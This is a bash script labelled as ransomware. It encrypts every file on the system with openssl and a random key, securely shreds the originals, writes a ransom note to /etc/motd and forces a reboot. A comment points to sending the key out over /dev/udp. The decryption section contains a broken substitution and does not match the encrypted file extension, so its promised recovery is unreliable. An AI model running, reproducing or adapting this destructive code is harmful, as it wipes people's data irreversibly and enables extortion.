#!/bin/bash
# matryo.sh.ka - bash ransomware script
# written by wilsonfisk
# original concept by Captain_Beezay
note="\e[91m
                      .-'\`'-.
            ,.-.,    ;( U U );
     _     ((a a))   : '_c_' :
   ((\"))    ) - (     ) ,-. (
  .'   '.  / .-, \   / (\@/) \\
  ( (@) ) ( (_@_) ) | (/')'\) |
  \__(__/  \__)__/   \___(___/
  Сюрприз! матrуо.sh.ка удары!
  All ur filez r bel0ng 2 us!
      p4y u5 0r e15e!!!!\e[0m"
# encrypt
key=$(strings /dev/urandom|grep -o '[[:alnum:]]'|head -n4096|tr -d '\n'|head -c3072|tail -c1024|tr -d '\n');\
export key;echo "$key">/tmp/decryption.key;\        # CHANGE TO /dev/udp/127.0.0.1/53
find / -type f 2>&1|while read -r file;do \
openssl enc -aes256-cbc -salt -e -a -in "$file" -out "$file.sh.ka" -pass "env:key";shred -fuz "$file";done;\
echo -e "$note" > /etc/motd;reboot -n &
#decrypt
echo -e "payment successful, decrypting files...";\
key=$(cat /tmp/decryption.key); find / -type f -iname "*.sh.ka" 2>&1|while read -r file;\
do openssl enc -aes256-cbc -d -a -in "$file" -out "$(echo "$file"|${$file//.ransom//})" -pass "env:key";
echo -e "files decrypted.";done
